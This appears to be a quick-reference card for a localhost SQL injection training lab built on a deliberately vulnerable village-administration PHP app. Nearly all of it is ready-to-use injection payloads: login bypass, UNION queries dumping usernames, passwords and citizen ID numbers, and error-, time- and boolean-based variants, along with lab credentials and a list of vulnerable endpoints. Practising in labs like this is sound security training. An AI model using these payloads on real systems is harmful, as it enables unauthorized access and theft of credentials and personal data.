# Quick Reference Card - SQL Injection Lab

## Target URLs
```
http://localhost/webdesa/                    # Beranda
http://localhost/webdesa/cek_warga.php       # Cek NIK (POST)
http://localhost/webdesa/berita_detail.php?id=1  # Berita (GET)
http://localhost/webdesa/admin/login.php     # Admin Login (POST)
http://localhost/webdesa/admin/warga.php?q=  # Search Warga (GET)
http://localhost/webdesa/admin/surat.php?status= # Filter Surat (GET)
```

## Quick Payloads

### Login Bypass
```
username: admin'-- -
password: [kosong]
```

### Cek Kolom (warga = 13)
```
nik: ' ORDER BY 13-- -   (OK)
nik: ' ORDER BY 14-- -   (ERROR)
```

### UNION SELECT (13 columns)
```
nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```

### Version
```
nik: ' UNION SELECT 1,2,version(),4,5,6,7,8,9,10,11,12,13-- -
```

### Database Name
```
nik: ' UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13-- -
```

### List Tables
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
```

### List Columns (users)
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump Users
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
```

### Dump Warga
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM warga-- -
```

### Error-Based
```
nik: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

### Time-Based
```
nik: ' AND SLEEP(5)-- -
```

### Boolean Check
```
nik: ' AND 1=1-- -  (true)
nik: ' AND 1=2-- -  (false)
```

## Database Info
- **DBMS:** MySQL/MariaDB
- **Database:** webdesa
- **Tables:** users, warga, surat_pengajuan, berita
- **Users:** admin/admin123, petugas1/petugas123

## Burp Suite Workflow
1. Set proxy: 127.0.0.1:8080
2. Intercept request
3. Send to Repeater (Ctrl+R)
4. Modify parameter
5. Send → Analyze response

## Hex Values
| Char | Hex |
|------|-----|
| : | 0x3a |
| newline | 0x0a |
| space | 0x20 |
| ' | 0x27 |

## Comment Syntax
```
-- -
--+
#
/* */
```

## Column Count (Verified)

| Tabel | Kolom | ORDER BY max |
|-------|-------|-------------|
| warga | 13 | ORDER BY 13 OK, 14 ERROR |
| berita | 6 | ORDER BY 6 OK, 7 ERROR |
| surat_pengajuan | 12 | ORDER BY 12 OK, 13 ERROR |
| users | 6 | ORDER BY 6 OK, 7 ERROR |

## File Locations
```
webdesa/
├── config/database.php      # DB connection
├── config/constants.php     # App constants
├── cek_warga.php            # SQLi point #1
├── ajukan_surat.php         # SQLi point #2, #3
├── riwayat.php              # SQLi point #4
├── berita_detail.php        # SQLi point #5
├── admin/login.php          # SQLi point #6
├── admin/warga.php          # SQLi point #7, #8, #9
├── admin/surat.php          # SQLi point #10, #11
└── admin/berita.php         # SQLi point #12
    berita_detail.php        # SQLi point #13 (sidebar query)
```
